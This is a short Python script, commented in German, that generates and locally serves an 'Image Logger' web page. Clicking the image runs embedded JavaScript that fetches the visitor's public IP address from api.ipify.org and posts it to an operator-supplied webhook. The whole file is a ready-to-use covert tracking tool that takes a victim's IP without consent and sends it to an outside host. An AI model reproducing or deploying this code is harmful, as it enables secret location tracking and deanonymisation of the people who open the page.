import http.server
import socketserver
import threading
import webbrowser

def create_html_file(webhook_url, image_url):
    # HTML-Inhalt mit eingebettetem JavaScript für den IP-Logger
    html_content = f'''
    <html>
    <head>
        <title>Image Logger</title>
    </head>
    <body>
        <img src="{image_url}" alt="Logged Image" onclick="fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {{
                fetch('{webhook_url}', {{
                    method: 'POST',
                    headers: {{
                        'Content-Type': 'application/json'
                    }},
                    body: JSON.stringify({{'content': 'IP Address: ' + data.ip}})
                }});
            }});" style="cursor:pointer;"/>
    </body>
    </html>
    '''
    return html_content

def serve_html(html_content):
    # Temporärer HTTP-Server
    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(html_content.encode('utf-8'))

    PORT = 8080
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print(f"Serving at port {PORT}")
        webbrowser.open(f'http://localhost:{PORT}')
        httpd.serve_forever()

def main():
    # Benutzer nach Webhook und Bild-URL fragen
    webhook_url = input("Enter webhook URL: ")
    image_url = input("Enter image URL: ")

    # HTML-Inhalt erstellen
    html_content = create_html_file(webhook_url, image_url)

    # HTML-Inhalt auf einem lokalen Server bereitstellen
    server_thread = threading.Thread(target=serve_html, args=(html_content,))
    server_thread.start()

if __name__ == "__main__":
    main()
